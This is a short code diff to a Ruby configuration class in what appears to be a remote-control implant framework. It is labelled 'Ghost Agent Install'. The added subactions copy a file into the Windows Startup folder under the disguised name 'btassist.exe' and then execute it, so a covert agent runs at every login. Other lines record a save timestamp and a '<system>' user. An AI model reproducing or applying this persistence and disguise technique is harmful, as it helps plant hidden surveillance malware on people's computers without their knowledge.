@@ -54,13 +54,17 @@ class Configuration
       "ts"=>"00:00:00",
       "desc"=>"Ghost In The Shell"}
     ghost_action = {"desc"=>"Ghost In The Shell",
-      "subactions"=>[{"action"=>"execute", "command"=>"move $dir$\\download_and_exec.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""}]}
+      "subactions"=>[
+          {"action"=>"execute", "command"=>"cmd.exe /c move $dir$\\ghits \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\btassist.exe\""},
+          {"action"=>"execute", "command"=>"\"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\btassist.exe\""},
+      ]}
 
     config['events'] << ghost_event
     config['actions'] << ghost_action
 
     self.config = config.to_json
     self.desc = "Ghost Agent Install"
+    self.saved = Time.now.getutc.to_i
     self.save
   end
 
@@ -72,6 +76,8 @@ class Configuration
 
     self.config = config.to_json
     self.desc = ""
+    self.saved = Time.now.getutc.to_i
+    self.user = "<system>"
     self.save
   end
 end
